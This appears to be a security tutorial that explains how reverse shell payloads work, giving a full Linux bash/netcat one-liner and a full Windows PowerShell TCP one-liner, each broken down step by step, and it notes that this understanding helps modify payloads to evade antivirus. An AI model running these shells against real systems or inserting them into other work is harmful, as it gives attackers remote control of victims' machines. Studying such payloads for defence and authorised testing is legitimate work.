## 1. What is a Payload?

In Information Security, a **payload** is the actual command and/or code that exploits a vulnerability to perform a malicious action (like establishing a shell).

* *Note:* Security tools like Windows Defender flag these payloads because they recognize the specific sequence of instructions as malicious code. Understanding *how* a payload works allows you to modify it to bypass these restrictions.

## 2. Linux Payload Anatomy: The Bash/Netcat One-Liner

This is one of the most common Linux reverse shell one-liners. It uses a named pipe (`FIFO`) to link a Netcat connection to an interactive bash shell.

**The Payload:**

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f

```

**Step-by-Step Breakdown:**

| Code Segment | Explanation |
| --- | --- |
| `rm -f /tmp/f;` | Removes the file `/tmp/f` if it already exists to prevent errors. |
| `mkfifo /tmp/f;` | Creates a FIFO "named pipe" at `/tmp/f`. A pipe allows data to flow between processes. |
| `cat /tmp/f |` | Reads the contents of the pipe and sends (pipes) it to the next command. |
| `/bin/bash -i 2>&1 |` | Spawns an interactive (`-i`) bash shell. `2>&1` ensures both errors (stderr) and normal output (stdout) are captured and piped to the next command. |
| `nc 10.10.14.12 7777 > /tmp/f` | Connects back to the attacker's Netcat listener. It takes the output from the bash shell, sends it over the network, and writes incoming attacker commands back into the `/tmp/f` pipe to repeat the cycle. |

## 3. Windows Payload Anatomy: The PowerShell One-Liner

Because Windows does not have Netcat installed by default, attackers rely on **PowerShell** and the built-in `.NET` framework to create a TCP socket and execute commands.

**The Payload:**

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

```

**Step-by-Step Breakdown:**

* **Initialization:**
* `powershell -nop -c` starts PowerShell without loading user profiles (`-nop`), making it stealthier and faster, and prepares it to execute the following string (`-c`).


* **Networking (`TCPClient`):**
* `$client = New-Object System.Net.Sockets.TCPClient('IP',PORT)` creates the network connection back to the attacker.
* `$stream = $client.GetStream()` opens the data stream to send/receive info.


* **The Listening Loop (`while`):**
* The script creates an empty byte array (`$bytes`) and enters a `while` loop that constantly reads the incoming data stream for attacker commands.


* **Execution (`Invoke-Expression`):**
* `$data = ...GetString(...)` translates the raw incoming network bytes into readable ASCII text.
* `$sendback = (iex $data 2>&1 | Out-String)` uses `iex` (Invoke-Expression) to actually run the attacker's command on the Windows machine and convert the output to a string.


* **Formatting & Sending Back:**
* `$sendback2 = $sendback + 'PS ' + (pwd).Path + '> '` appends a fake PowerShell prompt (e.g., `PS C:\> `) to make the remote terminal look normal to the attacker.
* `$stream.Write(...)` sends the execution results back over the network to the attacker's Netcat listener.



*Note: This exact logic is also packaged into reusable scripts, such as the famous `Invoke-PowerShellTcp.ps1` from the **Nishang** project, which handles this process cleanly without needing to cram it into a single line.*
